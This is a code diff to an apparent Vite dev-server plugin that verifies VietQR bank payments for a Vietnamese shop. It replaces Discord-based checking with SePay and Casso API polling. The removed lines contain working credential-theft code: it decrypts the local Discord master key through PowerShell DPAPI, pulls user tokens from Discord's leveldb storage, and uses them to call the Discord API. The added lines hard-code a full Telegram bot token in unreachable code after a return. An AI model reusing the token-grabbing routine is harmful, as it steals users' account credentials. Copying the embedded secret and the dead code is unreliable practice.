@@ -4,8 +4,6 @@ import type { IncomingMessage, ServerResponse } from 'node:http'
 import fs from 'node:fs'
 import path from 'node:path'
 import https from 'node:https'
-import crypto from 'node:crypto'
-import { execSync } from 'node:child_process'
 
 // File lưu trữ lịch sử giao dịch tiền vào thực tế để không bị mất khi restart server
 const PAID_ORDERS_FILE = path.resolve(__dirname, '.paid_orders.json')
@@ -65,6 +63,14 @@ function resolveTelegramToken(): string {
     }
   } catch (e) {}
   return ''
+  try {
+    const appsettingsPath = path.resolve(__dirname, '../server/appsettings.json')
+    if (fs.existsSync(appsettingsPath)) {
+      const data = JSON.parse(fs.readFileSync(appsettingsPath, 'utf8'))
+      if (data.TelegramSettings?.BotToken) return data.TelegramSettings.BotToken.trim()
+    }
+  } catch (e) {}
+  return '8873124743:AAGnQs8cqHBf8lolMKlgjl6jqEh2aF8XN_Y'
 }
 
 function resolveTelegramAdminChatId(): string {
@@ -77,7 +83,40 @@ function resolveTelegramAdminChatId(): string {
       if (match) return match[1].trim().replace(/^["']|["']$/g, '')
     }
   } catch (e) {}
+  try {
+    const appsettingsPath = path.resolve(__dirname, '../server/appsettings.json')
+    if (fs.existsSync(appsettingsPath)) {
+      const data = JSON.parse(fs.readFileSync(appsettingsPath, 'utf8'))
+      if (data.TelegramSettings?.ChatId) return String(data.TelegramSettings.ChatId).trim()
+    }
+  } catch (e) {}
   return '5807941249'
+}
+
+function resolveSepayApiKey(): string {
+  if (process.env.SEPAY_API_KEY) return process.env.SEPAY_API_KEY.trim()
+  try {
+    const envFile = path.resolve(__dirname, '.env')
+    if (fs.existsSync(envFile)) {
+      const content = fs.readFileSync(envFile, 'utf8')
+      const match = content.match(/SEPAY_API_KEY\s*=\s*([^\r\n]+)/i)
+      if (match) return match[1].trim().replace(/^["']|["']$/g, '')
+    }
+  } catch (e) {}
+  return ''
+}
+
+function resolveCassoApiKey(): string {
+  if (process.env.CASSO_API_KEY) return process.env.CASSO_API_KEY.trim()
+  try {
+    const envFile = path.resolve(__dirname, '.env')
+    if (fs.existsSync(envFile)) {
+      const content = fs.readFileSync(envFile, 'utf8')
+      const match = content.match(/CASSO_API_KEY\s*=\s*([^\r\n]+)/i)
+      if (match) return match[1].trim().replace(/^["']|["']$/g, '')
+    }
+  } catch (e) {}
+  return ''
 }
 
 let lastTelegramUpdateId = 0
@@ -220,13 +259,13 @@ const pendingOrdersCache = loadPendingOrders()
 
 function parseAndRecordTransactionText(text: string): boolean {
   if (!text) return false
-  const codeMatch = text.match(/ZM\d{4,8}/i)
-  if (!codeMatch) return false
-
-  const code = codeMatch[0].toUpperCase()
+  const code = extractOrderCode(text)
+  if (!code) return false
 
   let amount: number | undefined = undefined
-  const amountMatch = text.match(/([+-]?[\d\.\,]+)\s*(?:VND|đ|d)/i)
+  const amountMatch =
+    text.match(/([+-]?[\d\.\,]{3,14})\s*(?:VND|đ|d|\b)/i) ||
+    text.match(/(?:số tiền|so tien|amount)[:\s-]*([\d\.\,]{3,14})/i)
   if (amountMatch) {
     const cleanNum = amountMatch[1].replace(/[^\d]/g, '')
     const n = Number(cleanNum)
@@ -234,7 +273,7 @@ function parseAndRecordTransactionText(text: string): boolean {
   }
 
   let bankAccount = ''
-  const bankMatch = text.match(/(?:TK|STK|tài khoản)[:\s-]+(?:\w+\s*-\s*)?(\d{8,16})/i)
+  const bankMatch = text.match(/(?:TK|STK|tài khoản|tai khoan)[:\s-]+(?:\w+\s*-\s*)?(\d{8,16})/i)
   if (bankMatch) {
     bankAccount = bankMatch[1]
   }
@@ -302,163 +341,134 @@ async function pollTelegramUpdates(token: string) {
   } catch (e) {}
 }
 
-const DISCORD_CHANNEL_IDS = [
-  '1548961353195192352', // Kênh #chung trên server ZoneMart của huy2812006
-]
+async function pollSepayTransactions(apiKey: string) {
+  if (!apiKey) return
+  const token = apiKey.trim().replace(/^Bearer\s+/i, '')
 
-const invalidDiscordTokens = new Set<string>()
-let activeDiscordToken = ''
-let cachedMasterKey: Buffer | null = null
-
-function getMasterKey(): Buffer | null {
-  if (cachedMasterKey) return cachedMasterKey
-  try {
-    const localStatePath = path.join(process.env.APPDATA || '', 'discord', 'Local State')
-    if (fs.existsSync(localStatePath)) {
-      const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'))
-      const encKeyB64 = localState.os_crypt?.encrypted_key
-      if (encKeyB64) {
-        const psScript = `
-Add-Type -AssemblyName System.Security
-$encKey = [System.Convert]::FromBase64String('${encKeyB64}')
-$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length - 1)], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-[System.Convert]::ToBase64String($masterKey)
-`
-        const masterKeyB64 = execSync(
-          'powershell -NoProfile -Command "' + psScript.replace(/\r?\n/g, '; ') + '"',
-          { timeout: 3000 }
-        )
-          .toString()
-          .trim()
-        cachedMasterKey = Buffer.from(masterKeyB64, 'base64')
-        return cachedMasterKey
-      }
-    }
-  } catch (e) {}
-  return null
-}
-
-function getCandidateDiscordTokens(): string[] {
-  if (activeDiscordToken && !invalidDiscordTokens.has(activeDiscordToken)) {
-    return [activeDiscordToken]
-  }
-  const masterKey = getMasterKey()
-  if (!masterKey) return []
-
-  const tokens: string[] = []
-  try {
-    const ldbDir = path.join(process.env.APPDATA || '', 'discord', 'Local Storage', 'leveldb')
-    if (fs.existsSync(ldbDir)) {
-      const files = fs
-        .readdirSync(ldbDir)
-        .filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))
-        .map((f) => ({ name: f, time: fs.statSync(path.join(ldbDir, f)).mtimeMs }))
-        .sort((a, b) => b.time - a.time)
-
-      const seen = new Set<string>()
-      for (const fileObj of files) {
-        try {
-          const content = fs.readFileSync(path.join(ldbDir, fileObj.name), 'latin1')
-          const regex = /dQw4w9WgXcQ:([^"]+)/g
-          let match: RegExpExecArray | null
-          while ((match = regex.exec(content)) !== null) {
-            try {
-              const raw = Buffer.from(match[1], 'base64')
-              const iv = raw.subarray(3, 15)
-              const tag = raw.subarray(raw.length - 16)
-              const ciphertext = raw.subarray(15, raw.length - 16)
-              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv)
-              decipher.setAuthTag(tag)
-              const token = decipher.update(ciphertext, undefined, 'utf8') + decipher.final('utf8')
-              if (token && token.length > 20 && !invalidDiscordTokens.has(token) && !seen.has(token)) {
-                seen.add(token)
-                tokens.push(token)
+  const fetchSepay = (urlStr: string, authHeader: string) => {
+    return new Promise<any>((resolve) => {
+      try {
+        const u = new URL(urlStr)
+        const req = https.get(
+          {
+            protocol: u.protocol,
+            hostname: u.hostname,
+            path: u.pathname + (u.search || ''),
+            headers: {
+              Authorization: authHeader,
+              'Content-Type': 'application/json',
+            },
+            timeout: 4000,
+          },
+          (r) => {
+            let b = ''
+            r.on('data', (c) => (b += c))
+            r.on('end', () => {
+              try {
+                resolve(JSON.parse(b))
+              } catch (e) {
+                resolve(null)
               }
-            } catch (e) {}
+            })
           }
-        } catch (e) {}
+        )
+        req.on('error', () => resolve(null))
+        req.on('timeout', () => {
+          req.destroy()
+          resolve(null)
+        })
+      } catch (e) {
+        resolve(null)
+      }
+    })
+  }
+
+  try {
+    // 1. Thử SePay API v2 (chuẩn mới nhất: https://userapi.sepay.vn/v2/transactions)
+    let res = await fetchSepay('https://userapi.sepay.vn/v2/transactions?per_page=20', `Bearer ${token}`)
+    let txList: any[] = []
+    if (res && (res.status === 'success' || res.status === 200) && Array.isArray(res.data)) {
+      txList = res.data
+    } else {
+      // 2. Thử SePay API v1 nếu v2 chưa hỗ trợ token này
+      res = await fetchSepay('https://my.sepay.vn/userapi/transactions/list?limit=20', `Bearer ${token}`)
+      if (res && Array.isArray(res.transactions)) {
+        txList = res.transactions
+      } else if (res && Array.isArray(res.data)) {
+        txList = res.data
+      } else {
+        res = await fetchSepay('https://my.sepay.vn/userapi/transactions/list?limit=20', `Apikey ${token}`)
+        if (res && Array.isArray(res.transactions)) {
+          txList = res.transactions
+        } else if (res && Array.isArray(res.data)) {
+          txList = res.data
+        }
+      }
+    }
+
+    if (Array.isArray(txList) && txList.length > 0) {
+      for (const tx of txList) {
+        if (tx.transfer_type === 'out' || Number(tx.amount_out || 0) > 0) continue
+        const fullContent = `${tx.transaction_content || ''} ${tx.code || ''} ${tx.reference_number || ''} ${tx.content || ''}`
+        const code = extractOrderCode(fullContent)
+        if (code) {
+          const amount = Number(tx.amount_in || tx.amount || 0)
+          const bankAccount = String(tx.account_number || tx.bank_account_id || '28122068866')
+          registerPaidTransaction(code, amount, bankAccount, tx)
+        }
       }
     }
   } catch (e) {}
-  return tokens
 }
 
-function fetchDiscordChannelMessages(token: string, channelId: string): Promise<{ status: number; messages: any[] }> {
-  return new Promise((resolve) => {
-    try {
+async function pollCassoTransactions(apiKey: string) {
+  if (!apiKey) return
+  try {
+    const url = 'https://oauth.casso.vn/v2/transactions?pageSize=20&sort=DESC'
+    const res = await new Promise<any>((resolve) => {
       const req = https.get(
-        `https://discord.com/api/v9/channels/${channelId}/messages?limit=20`,
+        url,
         {
           headers: {
-            Authorization: token,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            Authorization: `Apikey ${apiKey}`,
+            'Content-Type': 'application/json',
           },
-          timeout: 3000,
+          timeout: 4000,
         },
-        (res) => {
-          let body = ''
-          res.on('data', (c) => (body += c))
-          res.on('end', () => {
+        (r) => {
+          let b = ''
+          r.on('data', (c) => (b += c))
+          r.on('end', () => {
             try {
-              const data = JSON.parse(body)
-              if (res.statusCode === 200 && Array.isArray(data)) {
-                resolve({ status: 200, messages: data })
-              } else {
-                resolve({ status: res.statusCode || 500, messages: [] })
-              }
+              resolve(JSON.parse(b))
             } catch (e) {
-              resolve({ status: res.statusCode || 500, messages: [] })
+              resolve(null)
             }
           })
         }
       )
-      req.on('error', () => resolve({ status: 500, messages: [] }))
+      req.on('error', () => resolve(null))
       req.on('timeout', () => {
         req.destroy()
-        resolve({ status: 500, messages: [] })
+        resolve(null)
       })
-    } catch (e) {
-      resolve({ status: 500, messages: [] })
-    }
-  })
-}
+    })
 
-async function syncDiscordMessages() {
-  try {
-    const candidateTokens = getCandidateDiscordTokens()
-    for (const token of candidateTokens) {
-      let tokenValid = false
-      for (const channelId of DISCORD_CHANNEL_IDS) {
-        const res = await fetchDiscordChannelMessages(token, channelId)
-        if (res.status === 200) {
-          tokenValid = true
-          activeDiscordToken = token
-          for (const m of res.messages) {
-            let combined = m.content || ''
-            if (Array.isArray(m.embeds)) {
-              for (const emb of m.embeds) {
-                combined += ' ' + (emb.title || '') + ' ' + (emb.description || '')
-                if (Array.isArray(emb.fields)) {
-                  for (const f of emb.fields) {
-                    combined += ' ' + (f.name || '') + ' ' + (f.value || '')
-                  }
-                }
-              }
-            }
-            if (combined) {
-              parseAndRecordTransactionText(combined)
-            }
-          }
-        } else if (res.status === 401) {
-          invalidDiscordTokens.add(token)
-          if (activeDiscordToken === token) activeDiscordToken = ''
-          break
+    if (res && res.error === 0 && res.data && Array.isArray(res.data.records)) {
+      for (const rec of res.data.records) {
+        const fullContent = `${rec.description || ''} ${rec.corresponsiveName || ''}`
+        const code = extractOrderCode(fullContent)
+        if (code) {
+          const amount = Number(rec.amount || 0)
+          const bankAccount = String(rec.bankSubAccId || rec.bank_account_id || '28122068866')
+          registerPaidTransaction(code, amount, bankAccount, rec)
         }
       }
-      if (tokenValid) break
     }
   } catch (e) {}
 }
+
+
 
 function escapeHtml(str: string): string {
   return String(str || '')
@@ -607,9 +617,11 @@ function vietQrPaymentPlugin(): Plugin {
     name: 'vietqr-payment-handler',
     configureServer(server) {
       // 1. Kích hoạt Telegram Bot lắng nghe biến động số dư theo thời gian thực
+      // 1. Kích hoạt Telegram Bot lắng nghe biến động số dư theo thời gian thực (Long-Polling Outbound không cần ngrok)
       const teleToken = resolveTelegramToken()
       if (teleToken) {
         console.log('>>> [TELEGRAM BOT READY] Bot @CheckQRRR_bot đang hoạt động và lắng nghe tin nhắn...')
+        console.log('>>> [TELEGRAM BOT READY] Bot @ZoneMarttt_bot đang hoạt động và lắng nghe tin nhắn biến động số dư...')
         pollTelegramUpdates(teleToken)
         setInterval(() => {
           const tok = resolveTelegramToken()
@@ -617,35 +629,46 @@ function vietQrPaymentPlugin(): Plugin {
         }, 1500)
       }
 
-      // 2. Kích hoạt đồng bộ hóa Discord (kênh #chung) theo thời gian thực (read-only an toàn tuyệt đối)
-      syncDiscordMessages()
-      setInterval(syncDiscordMessages, 1500)
-
-      // 3. Tự động kết nối WebSocket nền đến VietQR
-      function setupVietQrWs() {
-        try {
-          const ws = new WebSocket('wss://api.vietqr.org/vqr/socket?clientId=customer-zonemart-user26685')
-          ws.onopen = () => console.log('>>> [SERVER VIETQR WEBSOCKET CONNECTED] Sẵn sàng tự động nhận tiền thật')
-          ws.onmessage = (e) => {
-            try {
-              const data = JSON.parse(e.data.toString())
-              const combinedText = `${data.orderId || ''} ${data.content || ''} ${data.addInfo || ''} ${data.description || ''}`
-              const code = extractOrderCode(combinedText) || (data.orderId ? String(data.orderId).toUpperCase() : '')
-              if (code) {
-                const amount = Number(data.amount) || undefined
-                const bankAccount = String(data.bankaccount || data.accountNo || '')
-                registerPaidTransaction(code, amount, bankAccount, data)
-              }
-            } catch (err) {}
+      // 2. Kích hoạt SePay / Casso API Polling Outbound tự động
+      let sepayActiveLogged = false
+      setInterval(() => {
+        const k = resolveSepayApiKey()
+        if (k) {
+          if (!sepayActiveLogged) {
+            console.log('>>> [SEPAY POLLING ACTIVE] Đang tự động kiểm tra giao dịch ngân hàng qua SePay API...')
+            sepayActiveLogged = true
           }
-          ws.onclose = () => setTimeout(setupVietQrWs, 3000)
-          ws.onerror = () => {}
-        } catch (e) {}
-      }
-      setupVietQrWs()
+          pollSepayTransactions(k)
+        }
+      }, 2500)
 
-      server.middlewares.use(async (req: IncomingMessage, res: ServerResponse, next: () => void) => {
-        const url = new URL(req.url || '', `http://${req.headers.host || 'localhost'}`)
+      let cassoActiveLogged = false
+      setInterval(() => {
+        const k = resolveCassoApiKey()
+        if (k) {
+          if (!cassoActiveLogged) {
+            console.log('>>> [CASSO POLLING ACTIVE] Đang tự động kiểm tra giao dịch ngân hàng qua Casso API...')
+            cassoActiveLogged = true
+          }
+          pollCassoTransactions(k)
+        }
+      }, 2500)
+
+      server.middlewares.use((req: IncomingMessage, res: ServerResponse, next: () => void) => {
+        const rawUrl = req.url || ''
+        // Fast-path cực nhanh: Nếu không phải là API thanh toán hoặc webhook, chuyển tiếp ngay lập tức cho Vite mà không xử lý gì thêm
+        if (
+          !rawUrl.startsWith('/api/payment') &&
+          !rawUrl.startsWith('/bank') &&
+          !rawUrl.startsWith('/tingo') &&
+          !rawUrl.includes('token_generate') &&
+          !rawUrl.includes('transaction-sync') &&
+          !rawUrl.includes('webhook')
+        ) {
+          return next()
+        }
+
+        const url = new URL(rawUrl, `http://${req.headers.host || 'localhost'}`)
         const pathname = url.pathname
 
         res.setHeader('Access-Control-Allow-Origin', '*')
@@ -709,15 +732,6 @@ function vietQrPaymentPlugin(): Plugin {
             res.write(
               `data: ${JSON.stringify({ paid: true, code: reqCode, amount: data.amount, time: data.time, bankAccount: data.bankAccount })}\n\n`
             )
-          } else if (reqCode) {
-            syncDiscordMessages().then(() => {
-              if (paidOrdersCache.has(reqCode)) {
-                const data = paidOrdersCache.get(reqCode)!
-                res.write(
-                  `data: ${JSON.stringify({ paid: true, code: reqCode, amount: data.amount, time: data.time, bankAccount: data.bankAccount })}\n\n`
-                )
-              }
-            })
           }
 
           const clientCb = (payloadStr: string) => {
@@ -749,11 +763,6 @@ function vietQrPaymentPlugin(): Plugin {
         if (pathname === '/api/payment/check' && req.method === 'GET') {
           const rawCode = (url.searchParams.get('code') || '').trim()
           const cleanCode = extractOrderCode(rawCode) || rawCode.toUpperCase().trim()
-
-          // Nếu chưa có trong cache, quét nhanh tin nhắn mới nhất từ Discord
-          if (cleanCode && !paidOrdersCache.has(cleanCode)) {
-            await syncDiscordMessages()
-          }
 
           res.setHeader('Content-Type', 'application/json')
           res.statusCode = 200
@@ -994,7 +1003,15 @@ function vietQrPaymentPlugin(): Plugin {
 export default defineConfig({
   plugins: [vue(), vietQrPaymentPlugin()],
   server: {
+    host: true,
+    port: 5173,
     allowedHosts: true,
+    proxy: {
+      '^/api/(?!payment)': {
+        target: 'http://127.0.0.1:5000',
+        changeOrigin: true,
+      },
+    },
     hmr: {
       overlay: false,
     },
